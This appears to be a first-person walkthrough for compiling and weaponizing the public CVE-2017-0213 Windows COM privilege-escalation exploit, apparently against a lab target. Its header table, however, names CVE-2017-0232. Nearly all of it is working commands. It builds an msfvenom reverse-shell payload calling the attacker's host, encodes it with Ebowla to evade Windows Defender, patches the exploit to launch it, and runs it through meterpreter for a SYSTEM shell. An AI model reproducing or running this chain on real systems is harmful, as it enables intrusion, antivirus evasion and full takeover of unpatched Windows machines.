| CVE / MS  | Title | Vulns |
| --------- | ----- | ----- |
|  CVE-2017-0232 | Windows COM Aggregate Marshaler Lets Local Users Gain Elevated Privileges  | win_10 version_1511, win_10 version_1607, win_10 version_1703, win_10 version_1511 arc_x86, win_10 version_1607 arc_x86, win_10 version_1703 arc_x86, win_7 sp_1, win_7 sp_1 arc_x86, win_8.1, win_8.1 arc_x86, win_server_2008 sp_2, win_server_2008 sp_2 arc_x86, win_server_2008_r2 sp_1, win_server_2008_r2 sp_1 arc_x86, win_server_2012, win_server_2012 arc_x86, win_server_2016, win_server_2016 arc_x86 |

<br><br>

This is my first ever Windows exploit that I modified myself(even though its just two lines) and compiled! If you haven't done this before like me then its a good time to start now!<br><br>
To compile the C++ exploit you will need Microsoft Visual Studio version 2015 or later. I am using Microsoft Visual Studio 2019 in this POC. <br><br>Make sure to install all the Extensions related to C++ such as "
Desktop development with C++" , "Universal Windows Platform development" "C++/CLI support for v142 build tools" for Visual Studio 2019<br>or "Common tools for Visual C++ 2015" , "Microsoft Foundation Classes for C++" , "Windows XP Support for C++" for Visual Studio 2015.<br><br>
Assuming You have done installing, the next step is to find "vcvarsall.bat" in your Windows machine. In Visual Studio 2019 Community edition this file is located in : 

```
C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat
```

In Visual Studio 2015 Community edition this file is located in : 

```
C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\vcvarsall.bat
```
I am compiling the exploit for a x64 target so if you are going to compile for x86 then change amd64 to x86 in the below command : 

```sh
"C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvarsall.bat" amd64
```
Running this from your Windows machine should present you with a similar message like this depending on the version you are using: 

```sh
**********************************************************************
** Visual Studio 2019 Developer Command Prompt v16.0.0
** Copyright (c) 2019 Microsoft Corporation
**********************************************************************
[vcvarsall.bat] Environment initialized for: 'x64'
```
Now we have access to a command named "cl" on this CMD, this command is like gcc/g++ for Windows to compile source code to binary. Don't close this CMD as we will need this to compile our exploit.<br>
Download the C++ source code from <a href="https://raw.githubusercontent.com/WindowsExploits/Exploits/master/CVE-2017-0213/Source/CVE-2017-0213.cpp">Here</a> . It seems we need to add a library header to the exploit in order for the code to compile successfully. Add the below line at line 61 of the source code:

```sh
#pragma comment(lib, "Advapi32.lib")
```

Save the file as CVE-2017-0213.cpp and now we can test compile to make sure that we can actually compile exploits properly. Navigate your CMD to where the exploit file is and execute :

```sh
cl CVE-2017-0213.cpp /EHsc /DUNICODE /D_UNICODE
```

Running this should present below output if everything went okay : 

```sh
Microsoft (R) C/C++ Optimizing Compiler Version 19.20.27508.1 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

CVE-2017-0213.cpp
Microsoft (R) Incremental Linker Version 14.20.27508.1
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:CVE-2017-0213.exe
CVE-2017-0213.obj
```

We can see a file named CVE-2017-0213.exe in the same directory which means the compilation worked correctly.<br><br>
If you have a Remote desktop Session on your target machine then you can just copy the exe file to the target machine now and run it which will fire another CMD as System if the exploit worked. <br>But if you only have command line access on your target System then let's modify another line to make it usable via command line!<br><br>
Note: we need meterpreter session to execute the binary because this exploit doesn't work from a non-interactive shell.<br>
We will create a reverse shell backdoor through msfvenom and change the exploit to get us a reverse shell as System instead of popping cmd.exe:

```sh
msfvenom -f exe -p windows/x64/shell_reverse_tcp LHOST=<Your-Machine-IP> LPORT=9005 -a x64 -o rev.exe
```

Now this binary will be immediately deleted on a windows 10 or server 2016 box if Windows Defender is active. If you are trying this against a windows 7 box you don't need to encode the binary and skip this part. We will obfuscate the exe by encoding it with a tool named "Ebowla" ( now deprecated but still works! ) to bypass the defender. It Requires Go, Python 2 and Pip

```sh
git clone https://github.com/Genetic-Malware/Ebowla.git
pip install configobj
```

The tool is ready to be used. Now edit the "genetic.config" file inside the Ebowla directory, find and change the following Variables :

```sh
Encryption_Type = ENV
output_type = GO
payload_type = EXE
```

Find the [[ENV_VAR]] section. Set the value of the "computername" variable to the output of "hostname" command on your target machine. Suppose mine is 'tally' so I am putting it like this : 

```sh
username = ''
computername = 'tally'
homepath = ''
homedrive = ''
Number_of_processors = ''
processor_identifier = ''
processor_revision = ''
userdomain = ''
systemdrive = ''
userprofile = ''
path = ''
temp = ''
```

Leave other variables mentioned above blank and rest of the variables default, save and exit.
Now copy the rev.exe file in the Ebowla directory and execute : 

```sh
python ebowla.py rev.exe genetic.config

./build_x64_go.sh output/go_symmetric_rev.exe.go revx.exe
```

This produced an encoded version of the original exe program on output/revx.exe which won't get blocked by Windows Defender.
Now its time to modify our exploit command inside the exploit C++ source file to run the revx.exe instead of firing cmd.exe. Head to line 733 of the source file and change the line to this : 

```sh
WCHAR cmdline[] = L"C:\\Users\\Public\\revx.exe";
```

Save the source file as mod.cpp and compile it : 

```sh
cl mod.cpp /EHsc /DUNICODE /D_UNICODE
```

Now we have the mod.exe binary exploit file. Copy that file to your linux machine. We will use our meterpreter session to upload the mod.exe and the revx.exe to our target box: (adjust the source file location if they are not in the same directory)

```sh
meterpreter > upload mod.exe C:\\Users\\Public\\
meterpreter > upload revx.exe C:\\Users\\Public\\
```

Remember we had set Port 9005 in our rev.exe file so fire a netcat listener on a different terminal to listen on that port in order to catch the incoming reverse shell. Now all we have left to do is execute the mod.exe from our meterpreter session:

```sh
meterpreter > execute -f C:\\Users\\Public\\mod.exe
Process XXXX created.
```

You should receive a message like Process XXXX created. and receive a reverse shell as System on your netcat listener!<br><br>
Note: In-case your exploit fails migrate your meterpreter session to an interactive process and try again.
